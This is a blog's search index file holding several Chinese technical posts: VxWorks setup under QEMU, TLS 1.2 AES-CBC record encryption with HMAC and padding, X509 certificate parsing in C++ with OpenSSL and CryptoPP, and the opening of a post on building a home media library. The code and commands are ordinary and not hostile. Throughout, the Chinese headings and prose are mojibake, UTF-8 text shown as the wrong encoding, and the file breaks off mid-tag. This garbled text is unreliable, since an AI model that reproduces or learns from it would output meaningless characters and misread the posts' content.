<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vxworksç¯å¢ƒä¸ç¨‹åºéªŒè¯</title>
      <link href="/posts/e4b5eda/"/>
      <url>/posts/e4b5eda/</url>
      
        <content type="html"><![CDATA[<h1>Vxworksç¯å¢ƒä¸ç¨‹åºéªŒè¯</h1><p><strong>æ³¨æ„äº‹é¡¹</strong></p><ul><li>WorkBecnhæ¶æ„å¹³å°è¦é€‰æ‹©æ­£ç¡®</li><li>QEmuè¿è¡ŒVxworksæ‰§è¡Œæ­£ç¡®</li><li>é€šè¿‡FTPå°†vxeæ–‡ä»¶ä¼ è¾“ç»™VXWorks</li></ul><h2 id="æ­å»ºVxworksç¯å¢ƒ">æ­å»ºVxworksç¯å¢ƒ</h2><div class="story post-story"><ul><li>VmWareè™šæ‹Ÿæœºä¸­è¿è¡Œ vxworks6.8</li><li>VmWareè™šæ‹Ÿæœºä¸­è¿è¡ŒWIN10-workbench (vmware17)</li><li>è™šæ‹Ÿæœºäº’é€š</li></ul></div><h2 id="Qemuè¿è¡Œ">Qemuè¿è¡Œ</h2><div class="story post-story"><p>æ‰§è¡Œå‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash">qemu-system-i386 -monitor stdio -display none -vnc :0 -netdev bridge,id<span class="token operator">=</span>hn0,br<span class="token operator">=</span>br0 -device e1000-82544gc,netdev<span class="token operator">=</span>hn0 -hda image/vxboot.img</code></pre></div><h2 id="WorkBench-ç¼–è¯‘è¿è¡ŒApplicationé¡¹ç›®">WorkBench ç¼–è¯‘è¿è¡ŒApplicationé¡¹ç›®</h2><div class="story post-story"><blockquote><p>WorkBenchç¯å¢ƒæ­å»ºï¼š å‚è€ƒ WorkBenchæ­å»º</p><p><a href="https://blog.csdn.net/qq_41854911/article/details/140236822">VxWorksç¯å¢ƒæ­å»ºä¸å­¦ä¹ ï¼švxworks6.8å’Œworkbench3.2</a></p></blockquote><p>ä»¥ä¸‹é»˜è®¤å·²æ­å»ºå®Œæˆç¯å¢ƒï¼š</p><ol><li><p>WorkBecnhä¸­æ„å»º <strong>Real Tme Process Project</strong></p><p><img src="https://s2.loli.net/2025/02/24/QasbMp732yxHTJ1.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/24/QasbMp732yxHTJ1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250224160437798"></p></li><li><p>è®¾ç½®æ¶æ„å¹³å°ä¸º <code>PENTIUM4gnu</code></p></li></ol><p><img src="https://s2.loli.net/2025/02/24/uiMgvQcjYF8RKGz.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/24/uiMgvQcjYF8RKGz.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250224160521448"></p><ol start="3"><li><p>ç¼–è¯‘è¿è¡Œè·å¾— <code>vxe</code>æ–‡ä»¶<br><img src="https://s2.loli.net/2025/02/24/YVWN5GIUgXH9ykj.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/24/YVWN5GIUgXH9ykj.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250224160711860"></p><p><img src="https://s2.loli.net/2025/02/24/btL1aVEmkeNZ9cs.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/24/btL1aVEmkeNZ9cs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250224160742136"></p></li><li><p>å°†<code>vxe</code>æ–‡ä»¶é€šè¿‡ftpä¼ è¾“ç»™Vxworksä¸­</p></li><li><p>Qemu è¿è¡ŒVxworks æµ‹è¯•</p><p><img src="https://s2.loli.net/2025/02/24/IyYFhR6p9V8aftJ.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/24/IyYFhR6p9V8aftJ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250224160948335"></p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
          <category> Vxworks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VxWorks </tag>
            
            <tag> WorkBebch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES_CBCå—åŠ å¯†å®ç°è¸©å‘è®°å½•</title>
      <link href="/posts/b2230133/"/>
      <url>/posts/b2230133/</url>
      
        <content type="html"><![CDATA[<h1>AES_CBCå—åŠ å¯†å®ç°è¸©å‘è®°å½•</h1><h3 id="å—åŠ å¯†">å—åŠ å¯†</h3><p>ğŸ’¡ ä¸»è¦å®ç°</p><ul><li>âœ… æ”¯æŒ Encrypt-Then-MACï¼ˆETMï¼‰&amp; Mac-Then-Encrypt (MTE)ã€‚</li><li>âœ… æ”¯æŒ MAC-Then-Encryptï¼ˆæ ‡å‡† TLS 1.2ï¼‰ã€‚</li><li>âœ… æ ¹æ®åŠ å¯†å¥—ä»¶è¿›è¡Œå—åŠ å¯†ã€‚</li><li>âœ… ä½¿ç”¨åŠ å¯†å¥—ä»¶ä¸­çš„å“ˆå¸Œç®—æ³•è®¡ç®— MACã€‚</li></ul><p>ğŸ”¹ <strong>encrypt_record()</strong><br>æµç¨‹</p><ul><li>ç”Ÿæˆ éšæœº IVã€‚</li><li>è®¡ç®— HMAC-sha256ï¼ˆæ ¹æ® TLS 1.2 è®°å½•å±‚è§„åˆ™ï¼‰ä»¥HMAC-sha256ä¸ºä¾‹</li><li>AES-CBC åŠ å¯†ï¼ˆåŒ…å« MAC &amp; å¡«å……ï¼‰ ä»¥AES-CBCä¸ºä¾‹ã€‚</li><li>è¿”å› å®Œæ•´çš„ TLS è®°å½• (IV + Ciphertext)ã€‚</li></ul><p>ğŸ”¹ <strong>decrypt_record()</strong><br>æµç¨‹</p><ul><li>è§£æ IVï¼ˆæ˜¾å¼ IVï¼‰ã€‚</li><li>AES-CBC è§£å¯†ï¼ˆå»æ‰å¡«å……ï¼‰ã€‚</li><li>éªŒè¯ HMACï¼Œç¡®ä¿å®Œæ•´æ€§ã€‚</li><li>è¿”å› è§£å¯†åçš„æ˜æ–‡ã€‚</li></ul><h3 id="ğŸ”è®¡ç®—HMAC">ğŸ”è®¡ç®—HMAC</h3><p>HMACè®¡ç®—çš„è¾“å…¥ç»“æ„å¦‚ä¸‹</p><pre class="language-bash" data-language="bash"><code class="language-bash">AuthenticatedMetaData<span class="token punctuation">[</span>seq_num <span class="token punctuation">(</span>8B<span class="token punctuation">)</span> + ContentType <span class="token punctuation">(</span>1B<span class="token punctuation">)</span> + TLSVersion <span class="token punctuation">(</span>2B<span class="token punctuation">)</span> + Length <span class="token punctuation">(</span>2B<span class="token punctuation">)</span> <span class="token punctuation">]</span>+ AuthenticatedNoMetaData<span class="token punctuation">[</span>Finished æ˜æ–‡ <span class="token punctuation">(</span>16B<span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><p>è¾“å‡ºé•¿åº¦åº”è¯¥è·ŸMAC_Keyé•¿åº¦ä¸€è‡´</p><pre class="language-c" data-language="c"><code class="language-c">MAC<span class="token punctuation">[</span>mac_key_len<span class="token punctuation">]</span></code></pre><ul><li>seq_num (8B) ï¼šå½“å‰ TLS è®°å½•çš„åºåˆ—å·ï¼Œä» 0 å¼€å§‹ï¼Œæ¯å‘é€ä¸€ä¸ªè®°å½•å¢åŠ  1ã€‚</li><li>ContentType (1B) ï¼šFinished æ¶ˆæ¯çš„ ContentType ä¸º 0x16ï¼ˆHandshakeï¼‰ã€‚</li><li>TLSVersion (2B) ï¼šTLS 1.2 ç‰ˆæœ¬ï¼Œå€¼ä¸º 0x0303ã€‚</li><li>Length (2B) ï¼šFinished æ¶ˆæ¯çš„æ˜æ–‡é•¿åº¦ï¼Œå€¼ä¸º 0x000Cï¼ˆ12ï¼‰ã€‚</li><li>Plaintext (16B) ï¼šå³ Finishedæ¶ˆæ¯</li></ul><h3 id="ğŸ“ŒAES-å—åŠ å¯†">ğŸ“ŒAES å—åŠ å¯†</h3><p>AESåŠ å¯†çš„è¾“å…¥:</p><pre class="language-bash" data-language="bash"><code class="language-bash">plaintext <span class="token operator">=</span> data + MAC + Padding </code></pre><p><strong>è¦æ±‚ä¿è¯plaintextçš„é•¿åº¦æ—¶å—çš„å€æ•°</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*** æ³¨æ„ ä»…é€‚ç”¨äºéœ€è¦ PKCS#7 çš„æ¨¡å¼ï¼ˆå¦‚ AES-CBCã€AES-ECBï¼‰* ä¸é€‚ç”¨äº AES-GCMã€AES-CCMï¼ˆAEAD æ¨¡å¼ä¸éœ€è¦å¡«å……ï¼‰ã€‚*/</span><span class="token comment">//RFC5246 å®šä¹‰å—åŠ å¯†æ˜æ–‡ç»“æ„å¦‚ä¸‹</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  opaque IV<span class="token punctuation">[</span>SecurityParameters<span class="token punctuation">.</span>record_iv_length<span class="token punctuation">]</span><span class="token punctuation">;</span>  block<span class="token operator">-</span>ciphered <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>      opaque content<span class="token punctuation">[</span>TLSCompressed<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>      opaque MAC<span class="token punctuation">[</span>SecurityParameters<span class="token punctuation">.</span>mac_length<span class="token punctuation">]</span><span class="token punctuation">;</span>      uint8 padding<span class="token punctuation">[</span>GenericBlockCipher<span class="token punctuation">.</span>padding_length<span class="token punctuation">]</span><span class="token punctuation">;</span>      uint8 padding_length<span class="token punctuation">;</span> ï¼ï¼ï¼ï¼      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> GenericBlockCipher<span class="token punctuation">;</span></code></pre><p>æ ¹æ®RFC5246 ä¸­æè¿°ï¼Œ å®é™…çš„æ•°æ®è¦å¤šä¸€ä½ï¼Œå¤šä¸€ä¸ª<code>padding_length</code></p><p>è€Œåœ¨opensslæœåŠ¡ç«¯å¤„ç†è®¡ç®—Contexté•¿åº¦æ—¶ï¼š<br>ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">aesni_cbc_encrypt</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> out<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token operator">-></span>ks<span class="token punctuation">,</span> ctx<span class="token operator">-></span>base<span class="token punctuation">.</span>iv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//figure out payload length</span>pad <span class="token operator">=</span> out<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>inp_len <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token punctuation">(</span>SHA_DIGEST_LENGTH <span class="token operator">+</span> pad <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">:</span>SHA_DIGEST_LENGTH <span class="token operator">=</span> MAC_len</code></pre><p><img src="https://s2.loli.net/2025/02/21/wq2WEDgPzLsuF8x.png" class="lazyload" data-srcset="https://s2.loli.net/2025/02/21/wq2WEDgPzLsuF8x.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250221153955039"></p><p><font color="red"><strong>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¿™é‡Œåº”è¯¥å¡«å……<code>Padding_length-1</code> æ­£å¥½ä½¿å¾—è®¡ç®—çš„<code>inp_len</code>æ­£ç¡®ï¼Œ<br>å¦åˆ™ä¼šå¯¼è‡´è®¡ç®—MACå¤±è´¥</strong></font></p><h3 id="âœ…-å¦‚ä½•ç¡®è®¤ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ï¼Ÿ">âœ… å¦‚ä½•ç¡®è®¤ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ï¼Ÿ</h3><p>åœ¨ ClientHello / ServerHello æ¡æ‰‹ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¼šåå•†ä¸€ä¸ª CipherSuiteï¼Œå…¶ä¸­ä¼šæŒ‡æ˜ HMAC çš„å“ˆå¸Œç®—æ³•ã€‚ä¾‹å¦‚ï¼š</p><table><thead><tr><th>CipherSuite</th><th>å¯†é’¥äº¤æ¢ç®—æ³•</th><th>å¯¹ç§°åŠ å¯†ç®—æ³•</th><th>MACï¼ˆHMAC å“ˆå¸Œï¼‰ç®—æ³•</th></tr></thead><tbody><tr><td><code>TLS_RSA_WITH_AES_128_CBC_SHA</code></td><td>RSA</td><td>AES-128-CBC</td><td><strong>SHA-1</strong></td></tr><tr><td><code>TLS_RSA_WITH_AES_128_CBC_SHA256</code></td><td>RSA</td><td>AES-128-CBC</td><td><strong>SHA-256</strong></td></tr><tr><td><code>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</code></td><td>DHE + RSA</td><td>AES-256-GCM</td><td><strong>SHA-384</strong></td></tr><tr><td><code>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code></td><td>ECDHE + RSA</td><td>AES-128-GCM</td><td><strong>SHA-256</strong></td></tr></tbody></table><p>æ‰€ä»¥ï¼Œæœ€ç»ˆçš„ HMAC å“ˆå¸Œç®—æ³•æ˜¯ç”± CipherSuite é€‰æ‹©çš„ã€‚</p><table><thead><tr><th>MAC</th><th>Algorithm</th><th>mac_length</th><th>mac_key_length</th></tr></thead><tbody><tr><td>NULL</td><td>N/A</td><td>0</td><td>0</td></tr><tr><td>MD5</td><td>HMAC-MD5</td><td>16</td><td>16</td></tr><tr><td>SHA</td><td>HMAC-SHA1</td><td>20</td><td>20</td></tr><tr><td>SHA256</td><td>HMAC-SHA256</td><td>32</td><td>32</td></tr></tbody></table><h3 id="éªŒè¯åŠ å¯†ç»“æœæ˜¯å¦æ­£ç¡®">éªŒè¯åŠ å¯†ç»“æœæ˜¯å¦æ­£ç¡®</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. ç”Ÿæˆå¡«å……åçš„æ˜æ–‡äºŒè¿›åˆ¶æ–‡ä»¶</span><span class="token builtin class-name">echo</span> <span class="token string">"1400000C0117E62EBD66175B27F52831E24C395647FEB439288B9D27C4B92BAF55928D350B0B0B0B0B0B0B0B0B0B0B0B10101010101010101010101010101010"</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">></span> padded.bin<span class="token comment"># æ‰§è¡ŒAES-128-CBCåŠ å¯†</span>openssl enc -aes-128-cbc -nosalt <span class="token punctuation">\</span>  -K B7B77162CBF57D2A280CD9E77832877A <span class="token punctuation">\</span>  -iv 93578CFC6863B968A97327948D368FC1 <span class="token punctuation">\</span>  -in padded.bin -out encrypted.bin<span class="token comment"># æŸ¥çœ‹åŠ å¯†ç»“æœï¼ˆHexæ ¼å¼ï¼‰</span>xxd -p encrypted.bin <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssl X509è¯ä¹¦ä»HexStreamä¸­è§£æ</title>
      <link href="/posts/1e2fb27c/"/>
      <url>/posts/1e2fb27c/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•´ä½“æ€è·¯">æ•´ä½“æ€è·¯</h2><div class="story post-story"><p>ä»<code>hex</code> è½¬æ¢æˆå­—èŠ‚æµ</p><p>ç„¶åä»å­—èŠ‚æµä¸­è¿›è¡Œè§£æ</p><blockquote><h3 id="You-have-access-to-the-raw-certificate-in-memory">You have access to the raw certificate in memory.</h3><p>In the case that you have access to the raw  encoding of the certificate in memory, you can parse it as follows. This is useful if you have stored raw certificates in a database or similar  data store.</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> </span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">;</span>size_t len <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">;</span>X509 <span class="token operator">*</span>cert <span class="token operator">=</span> <span class="token function">d2i_X509</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cert<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"unable to parse certificate in memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// any additional processing would go here..</span><span class="token function">X509_free</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote></div><h2 id="ä½¿ç”¨OpenSSL-è§£æ">ä½¿ç”¨OpenSSL è§£æ</h2><div class="story post-story"><pre class="language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>string hex_str <span class="token operator">=</span> <span class="token string">"30820317308201ffa003020102021432e1f....."</span><span class="token punctuation">;</span><span class="token comment">// hex -> binaryData</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">uint8_t</span><span class="token operator">></span> binaryData<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex_str<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> byte<span class="token punctuation">;</span>    <span class="token function">sscanf</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"%02X"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte<span class="token punctuation">)</span><span class="token punctuation">;</span>    binaryData<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// å°† char* è½¬æ¢ä¸º unsigned char*</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> uchar_ptr <span class="token operator">=</span> binaryData<span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>size_t len <span class="token operator">=</span> binaryData<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>X509 <span class="token operator">*</span>cert  <span class="token operator">=</span> <span class="token function">d2i_X509</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>uchar_ptr<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cert<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed to load certificate from bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// æ‰“å°è¯ä¹¦ä¿¡æ¯</span><span class="token function">X509_print_fp</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> cert<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é‡Šæ”¾èµ„æº</span><span class="token function">X509_free</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div><h2 id="ä½¿ç”¨CryptoPP-è§£æ">ä½¿ç”¨CryptoPP è§£æ</h2><div class="story post-story"><pre class="language-cpp" data-language="cpp"><code class="language-cpp">   std<span class="token double-colon punctuation">::</span>string hex_str <span class="token operator">=</span> <span class="token string">"30820317308201ffa003020102021....."</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string binaryData<span class="token punctuation">;</span>    <span class="token class-name">CryptoPP</span><span class="token double-colon punctuation">::</span><span class="token function">StringSource</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                 <span class="token keyword">new</span> <span class="token class-name">CryptoPP</span><span class="token double-colon punctuation">::</span><span class="token function">HexDecoder</span><span class="token punctuation">(</span>                         <span class="token keyword">new</span> <span class="token class-name">CryptoPP</span><span class="token double-colon punctuation">::</span><span class="token function">StringSink</span><span class="token punctuation">(</span>binaryData<span class="token punctuation">)</span>                 <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    CryptoPP<span class="token double-colon punctuation">::</span>ByteQueue googleq<span class="token punctuation">,</span> thawteq<span class="token punctuation">,</span> googletbs<span class="token punctuation">,</span> thawtespki<span class="token punctuation">;</span>    CryptoPP<span class="token double-colon punctuation">::</span>SecByteBlock certSignature<span class="token punctuation">;</span>    googleq<span class="token punctuation">.</span><span class="token function">Put</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> CryptoPP<span class="token double-colon punctuation">::</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>binaryData<span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> binaryData<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    CryptoPP<span class="token double-colon punctuation">::</span>X509Certificate cert<span class="token punctuation">;</span>    cert<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>googleq<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è·å–å…¬é’¥</span>    <span class="token keyword">const</span> CryptoPP<span class="token double-colon punctuation">::</span>PublicKey<span class="token operator">&amp;</span> publicKey <span class="token operator">=</span> cert<span class="token punctuation">.</span><span class="token function">GetSubjectPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å¦‚æœä½ ç¡®å®šè¯ä¹¦çš„ç±»å‹æ˜¯ RSAï¼Œä½ å¯ä»¥å°† PublicKey å¼ºåˆ¶è½¬æ¢ä¸º RSA å…¬é’¥</span>    <span class="token keyword">const</span> CryptoPP<span class="token double-colon punctuation">::</span>RSA<span class="token double-colon punctuation">::</span>PublicKey<span class="token operator">&amp;</span> rsaPublicKey <span class="token operator">=</span> <span class="token generic-function"><span class="token function">dynamic_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> RSA<span class="token double-colon punctuation">::</span>PublicKey<span class="token operator">&amp;</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è·å– RSA æ¨¡æ•°</span>    <span class="token keyword">const</span> CryptoPP<span class="token double-colon punctuation">::</span>Integer<span class="token operator">&amp;</span> modulus <span class="token operator">=</span> rsaPublicKey<span class="token punctuation">.</span><span class="token function">GetModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‰“å°å…¬é’¥ä¿¡æ¯</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Public Key: "</span> <span class="token operator">&lt;&lt;</span>rsaPublicKey<span class="token punctuation">.</span><span class="token function">GetPublicExponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// æ‰“å° RSA æ¨¡æ•°</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"RSA Modulus: "</span> <span class="token operator">&lt;&lt;</span> modulus<span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span></code></pre></div><h2 id=""></h2><div class="story post-story"></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X509è¯ä¹¦è§£æ </tag>
            
            <tag> HexStream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­å»ºå½±è§†åº“è¯•è¯•æ‰‹</title>
      <link href="/posts/74e6b323/"/>
      <url>/posts/74e6b323/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><div class="story post-story"><p>æˆ‘æ‰¿è®¤æˆ‘ç»„ä¼šçš„æ—¶å€™å¼€å°å·®äº†ï¼Œåœ¨å¦‚æ­¤é«˜å‹çš„æƒ…å†µä¸‹ï¼Œæˆ‘ç«Ÿåœ¨ç¥æ¸¸~ã€‚è„‘è¢‹é‡Œçªç„¶æƒ³åˆ°æˆ‘ä¹‹å‰åˆ·çŸ¥ä¹çœ‹åˆ°çš„ç¾¤æ™–NASä¹‹ç±»çš„ç›¸å…³è¯é¢˜ï¼Œç„¶åå°±æœ‰äº†å¼„ä¸ªåª’ä½“åº“çš„æƒ³æ³•ï¼Œé¡ºä¾¿æ•´ç†æ•´ç†æˆ‘çš„è®¾å¤‡ä¸ŠPTåšçš„ç§å­ã€‚è¯´ç™½äº†NASå°±æ˜¯ä¸€ä¸ª24Hä¸å…³æœºçš„å…±äº«æœåŠ¡å™¨å˜›ï¼Œæ­£å¥½æˆ‘çš„å·¥ä½œæœºå™¨å°±æ˜¯24Hä¸å…³æœºï¼Œåœ¨è„‘æµ·é‡Œå¤§æ¦‚æµ®ç°äº†é¢„è®¾çš„ç”»é¢ï¼š</p><p>å¯¹åª’ä½“åº“çš„é¢„è®¾æœŸæœ›ï¼š</p><ol><li><p>èƒ½å¤Ÿè‡ªåŠ¨æ•´ç†åšç§çš„å½±ç‰‡</p><p>ï¼ˆè™½ç„¶PTä¸‹è½½çš„æ—¶å€™å¤§æ¦‚åˆ†äº†ç±»ï¼Œä½†æ˜¯å†°å†·çš„æ–‡ä»¶å¤¹å¤ªå†·æ¼ äº†ï¼‰</p></li><li><p>å¯¹åšç§çš„èµ„æºè¿›è¡Œè‡ªåŠ¨åˆ®å‰Šï¼Œç±»ä¼¼äºçˆ±å¥‡è‰ºè¿™æ ·çš„è§†é¢‘ç½‘ç«™ï¼Œèƒ½çœ‹ç”µå½±æˆ–ç”µè§†å‰§çš„è¯¦ç»†ä¿¡æ¯ï¼Œç®€ä»‹å•¥çš„</p><p>(æ¯•ç«Ÿè‡ªå·±æ‰‹åŠ¨å»æŸ¥ä¿¡æ¯çœŸçš„å¤ªéº»çƒ¦äº†)</p></li><li><p>å¯ä»¥ä»æ‰‹æœº/å…¶ä»–è®¾å¤‡ç›´æ¥åœ¨çº¿æ’­æ”¾è§†é¢‘</p><p>ï¼ˆæ¯•ç«Ÿè°ä¸æƒ³èººåœ¨åºŠä¸Šä»¥ä¸€ä¸ªèˆ’æœçš„å§¿åŠ¿çœ‹æ— æŸçš„èµ„æºå‘¢ï¼‰</p></li></ol><p>æ‰€ä»¥è¯´å¹²å°±å¹²å§ï¼Œæ­£å¥½æˆ‘çš„ä¸¤ä¸ªç¡¬ç›˜éƒ½æ»¡äº†</p><p><img src="https://s2.loli.net/2024/03/18/8TmY9xoApQvqftC.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/8TmY9xoApQvqftC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 